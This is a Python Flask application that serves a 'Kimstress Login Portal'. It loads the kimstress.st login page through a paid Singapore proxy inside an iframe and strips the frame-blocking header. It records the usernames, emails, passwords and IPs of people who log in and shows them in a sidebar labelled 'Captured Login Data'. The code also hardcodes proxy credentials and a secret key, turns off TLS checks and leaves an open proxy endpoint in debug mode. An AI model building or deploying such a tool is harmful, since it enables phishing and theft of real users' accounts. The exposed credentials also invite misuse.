from flask import Flask, render_template_string, request, jsonify, Response, session
from flask_cors import CORS
import requests
from urllib.parse import urlparse
import logging
import os
import time
import json
from datetime import datetime
import base64

# Proxy Configuration
PROXY_CONFIG = {
    'server': 'http://change4.owlproxy.com:7778',
    'username': 'IIOL0QVOzN30_custom_zone_SG_st__city_sid_79312845_time_5',
    'password': '2272641'
}
PROXY_ENABLED = True

app = Flask(__name__)
app.secret_key = 'kimstress-secret-key-2024'
CORS(app)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# In-memory storage
login_database = []

def get_proxy_dict():
    """Get proxy dictionary for requests"""
    if not PROXY_ENABLED:
        return None
    
    # Format: http://username:password@host:port
    proxy_url = f"http://{PROXY_CONFIG['username']}:{PROXY_CONFIG['password']}@change4.owlproxy.com:7778"
    
    proxies = {
        'http': proxy_url,
        'https': proxy_url
    }
    return proxies

# HTML Template with working iframe
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kimstress Login Portal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #1a1a2e;
            padding: 20px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: 1fr 350px;
            gap: 20px;
        }
        .main {
            background: white;
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
        }
        .header h1 { font-size: 24px; }
        .proxy-status {
            background: #f8f9fa;
            padding: 15px 20px;
            border-bottom: 1px solid #dee2e6;
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
        }
        .status-badge {
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 500;
        }
        .badge-success { background: #d4edda; color: #155724; }
        .badge-danger { background: #f8d7da; color: #721c24; }
        .badge-warning { background: #fff3cd; color: #856404; }
        .iframe-container {
            height: 600px;
            background: #f5f5f5;
            position: relative;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
        .loading {
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(255,255,255,0.9);
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            gap: 15px;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .controls {
            padding: 20px;
            background: white;
            border-top: 1px solid #dee2e6;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.3s;
        }
        .btn-primary { background: #667eea; color: white; }
        .btn-primary:hover { background: #5a67d8; }
        .btn-danger { background: #dc3545; color: white; }
        .btn-success { background: #28a745; color: white; }
        .btn-secondary { background: #6c757d; color: white; }
        
        .sidebar {
            background: white;
            border-radius: 15px;
            padding: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            height: fit-content;
        }
        .sidebar h3 { margin-bottom: 15px; color: #333; }
        
        .login-item {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 12px;
            margin-bottom: 10px;
            border-left: 4px solid #667eea;
        }
        .login-time {
            font-size: 11px;
            color: #666;
            margin-bottom: 5px;
        }
        .login-detail {
            font-size: 12px;
            margin: 3px 0;
            word-break: break-all;
        }
        .login-detail strong {
            color: #333;
            width: 70px;
            display: inline-block;
        }
        .empty-state {
            text-align: center;
            padding: 40px 20px;
            color: #999;
        }
        .stats {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 15px;
            border-radius: 10px;
            text-align: center;
        }
        .stat-number { font-size: 24px; font-weight: bold; }
        .stat-label { font-size: 12px; opacity: 0.9; }
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 25px;
            border-radius: 10px;
            color: white;
            z-index: 9999;
            display: none;
            animation: slideIn 0.3s;
        }
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="notification" id="notification"></div>
    
    <div class="container">
        <div class="main">
            <div class="header">
                <h1>🔐 Kimstress.st Login Portal</h1>
                <div style="margin-top: 10px; font-size: 14px; opacity: 0.9;">
                    🌏 Singapore Proxy • Secure Connection
                </div>
            </div>
            
            <div class="proxy-status" id="proxyStatus">
                <span class="status-badge badge-warning" id="statusBadge">
                    ⏳ Checking proxy...
                </span>
                <span id="proxyInfo">Testing connection...</span>
            </div>
            
            <div class="iframe-container">
                <iframe id="mainIframe" src="/proxy?url=https://kimstress.st/login"></iframe>
                <div class="loading" id="loading">
                    <div class="spinner"></div>
                    <div>Loading via Singapore proxy...</div>
                </div>
            </div>
            
            <div class="controls">
                <button class="btn btn-primary" onclick="reloadIframe()">🔄 Reload</button>
                <button class="btn btn-success" onclick="testProxyNow()">🌐 Test Proxy</button>
                <button class="btn btn-secondary" onclick="openNewTab()">↗️ Open in New Tab</button>
                <button class="btn btn-danger" onclick="clearHistory()">🗑 Clear History</button>
            </div>
        </div>
        
        <div class="sidebar">
            <h3>📋 Captured Login Data</h3>
            <div class="stats">
                <div class="stat-card">
                    <div class="stat-number" id="totalLogins">0</div>
                    <div class="stat-label">Total</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number" id="todayLogins">0</div>
                    <div class="stat-label">Today</div>
                </div>
            </div>
            <div id="loginList"></div>
        </div>
    </div>

    <script>
        let loginData = [];
        
        // Load saved data
        fetch('/get-logins')
            .then(res => res.json())
            .then(data => {
                loginData = data;
                updateLoginList();
            });
        
        // Check proxy status on load
        checkProxyStatus();
        
        function checkProxyStatus() {
            fetch('/proxy-check')
                .then(res => res.json())
                .then(data => {
                    const badge = document.getElementById('statusBadge');
                    const info = document.getElementById('proxyInfo');
                    
                    if (data.status === 'connected') {
                        badge.className = 'status-badge badge-success';
                        badge.innerHTML = '✅ Proxy Connected';
                        info.innerHTML = `IP: ${data.ip} | Location: ${data.location} | Latency: ${data.latency}ms`;
                    } else {
                        badge.className = 'status-badge badge-danger';
                        badge.innerHTML = '❌ Proxy Failed';
                        info.innerHTML = data.message || 'Using direct connection';
                    }
                });
        }
        
        function testProxyNow() {
            document.getElementById('statusBadge').innerHTML = '⏳ Testing...';
            fetch('/test-proxy-now')
                .then(res => res.json())
                .then(data => {
                    if (data.status === 'success') {
                        showNotification('✅ Proxy working! IP: ' + data.ip, 'success');
                        checkProxyStatus();
                    } else {
                        showNotification('❌ Proxy failed: ' + data.message, 'error');
                    }
                });
        }
        
        function reloadIframe() {
            document.getElementById('loading').style.display = 'flex';
            document.getElementById('mainIframe').src = '/proxy?url=https://kimstress.st/login&t=' + Date.now();
            
            // Hide loading after 3 seconds
            setTimeout(() => {
                document.getElementById('loading').style.display = 'none';
            }, 3000);
        }
        
        function openNewTab() {
            window.open('https://kimstress.st/login', '_blank');
        }
        
        // Listen for iframe messages
        window.addEventListener('message', function(event) {
            if (event.data.type === 'login') {
                saveLogin(event.data.data);
            }
        });
        
        function saveLogin(data) {
            fetch('/save-login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            })
            .then(res => res.json())
            .then(data => {
                loginData = data;
                updateLoginList();
                showNotification('✅ Login data captured!', 'success');
            });
        }
        
        function updateLoginList() {
            const container = document.getElementById('loginList');
            const totalEl = document.getElementById('totalLogins');
            const todayEl = document.getElementById('todayLogins');
            
            totalEl.textContent = loginData.length;
            
            // Today's count
            const today = new Date().toDateString();
            const todayCount = loginData.filter(d => new Date(d.timestamp).toDateString() === today).length;
            todayEl.textContent = todayCount;
            
            if (loginData.length === 0) {
                container.innerHTML = '<div class="empty-state">📭 No login data yet</div>';
                return;
            }
            
            let html = '';
            loginData.slice().reverse().forEach(data => {
                const time = new Date(data.timestamp).toLocaleString();
                html += `
                    <div class="login-item">
                        <div class="login-time">🕐 ${time}</div>
                        ${data.username ? `<div class="login-detail"><strong>User:</strong> ${data.username}</div>` : ''}
                        ${data.email ? `<div class="login-detail"><strong>Email:</strong> ${data.email}</div>` : ''}
                        ${data.password ? `<div class="login-detail"><strong>Pass:</strong> ${data.password}</div>` : ''}
                        <div class="login-detail"><strong>IP:</strong> ${data.ip || 'N/A'}</div>
                    </div>
                `;
            });
            container.innerHTML = html;
        }
        
        function clearHistory() {
            if (confirm('Clear all login data?')) {
                fetch('/clear-logins', {method: 'POST'})
                    .then(() => {
                        loginData = [];
                        updateLoginList();
                        showNotification('🗑 History cleared', 'success');
                    });
            }
        }
        
        function showNotification(msg, type) {
            const notif = document.getElementById('notification');
            notif.style.display = 'block';
            notif.textContent = msg;
            notif.style.background = type === 'success' ? '#28a745' : '#dc3545';
            setTimeout(() => notif.style.display = 'none', 3000);
        }
        
        // Auto hide loading when iframe loads
        document.getElementById('mainIframe').onload = function() {
            document.getElementById('loading').style.display = 'none';
        };
        
        // Check proxy every 30 seconds
        setInterval(checkProxyStatus, 30000);
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/proxy')
def proxy():
    """Proxy endpoint with better error handling"""
    target_url = request.args.get('url', 'https://kimstress.st/login')
    
    try:
        # Get proxy configuration
        proxies = get_proxy_dict()
        
        # Headers to mimic browser
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache'
        }
        
        logger.info(f"Fetching {target_url} with proxy: {PROXY_ENABLED}")
        
        # Try with proxy first
        if proxies:
            try:
                response = requests.get(
                    target_url,
                    headers=headers,
                    timeout=15,
                    proxies=proxies,
                    allow_redirects=True,
                    verify=False
                )
                logger.info(f"Proxy success: {response.status_code}")
            except Exception as e:
                logger.error(f"Proxy failed: {e}, trying direct...")
                # Fallback to direct connection
                response = requests.get(
                    target_url,
                    headers=headers,
                    timeout=15,
                    allow_redirects=True,
                    verify=False
                )
        else:
            # Direct connection
            response = requests.get(
                target_url,
                headers=headers,
                timeout=15,
                allow_redirects=True,
                verify=False
            )
        
        # Create response
        proxy_response = Response(
            response.content,
            status=response.status_code,
            content_type=response.headers.get('Content-Type', 'text/html')
        )
        
        # Allow iframe embedding
        proxy_response.headers['Access-Control-Allow-Origin'] = '*'
        proxy_response.headers['X-Frame-Options'] = 'ALLOWALL'
        
        if 'X-Frame-Options' in proxy_response.headers:
            del proxy_response.headers['X-Frame-Options']
            
        return proxy_response
        
    except Exception as e:
        logger.error(f"Proxy error: {e}")
        return f"""
        <html>
        <body style="font-family: Arial; padding: 40px; text-align: center;">
            <h2>⚠️ Connection Error</h2>
            <p>Error: {str(e)}</p>
            <button onclick="location.reload()" style="padding: 10px 20px; margin-top: 20px;">Retry</button>
        </body>
        </html>
        """

@app.route('/proxy-check')
def proxy_check():
    """Check proxy status"""
    try:
        proxies = get_proxy_dict()
        if not proxies:
            return jsonify({"status": "disabled", "message": "Proxy disabled"})
        
        # Test proxy
        start = time.time()
        response = requests.get(
            'http://httpbin.org/ip',
            proxies=proxies,
            timeout=10,
            verify=False
        )
        latency = int((time.time() - start) * 1000)
        
        if response.status_code == 200:
            data = response.json()
            ip = data.get('origin', 'Unknown')
            
            # Get location
            try:
                loc_res = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
                if loc_res.status_code == 200:
                    loc_data = loc_res.json()
                    location = f"{loc_data.get('city', 'Singapore')}, {loc_data.get('country', 'Singapore')}"
                else:
                    location = "Singapore"
            except:
                location = "Singapore"
            
            return jsonify({
                "status": "connected",
                "ip": ip,
                "location": location,
                "latency": latency,
                "proxy": PROXY_CONFIG['server']
            })
        else:
            return jsonify({"status": "error", "message": "Proxy test failed"})
            
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/test-proxy-now')
def test_proxy_now():
    """Test proxy immediately"""
    try:
        proxies = get_proxy_dict()
        if not proxies:
            return jsonify({"status": "error", "message": "Proxy disabled"})
        
        response = requests.get(
            'https://api.ipify.org?format=json',
            proxies=proxies,
            timeout=10,
            verify=False
        )
        
        if response.status_code == 200:
            ip = response.json().get('ip', 'Unknown')
            return jsonify({"status": "success", "ip": ip})
        else:
            return jsonify({"status": "error", "message": "Failed to get IP"})
            
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/save-login', methods=['POST'])
def save_login():
    """Save login data"""
    global login_database
    try:
        data = request.json
        data['timestamp'] = datetime.now().isoformat()
        data['ip'] = request.remote_addr
        data['proxy'] = PROXY_CONFIG['server'] if PROXY_ENABLED else 'direct'
        
        login_database.append(data)
        
        # Keep last 100
        if len(login_database) > 100:
            login_database = login_database[-100:]
        
        return jsonify(login_database)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/get-logins')
def get_logins():
    return jsonify(login_database)

@app.route('/clear-logins', methods=['POST'])
def clear_logins():
    global login_database
    login_database = []
    return jsonify({"success": True})

@app.route('/health')
def health():
    return jsonify({
        "status": "healthy",
        "proxy_enabled": PROXY_ENABLED,
        "logins": len(login_database),
        "time": datetime.now().isoformat()
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("="*60)
    print("🚀 Kimstress Login Proxy Server")
    print("="*60)
    print(f"📍 Proxy: {PROXY_CONFIG['server']}")
    print(f"🔑 Username: {PROXY_CONFIG['username'][:20]}...")
    print(f"🌏 Location: Singapore")
    print(f"📊 URL: http://localhost:{port}")
    print("="*60)
    
    app.run(host='0.0.0.0', port=port, debug=True)
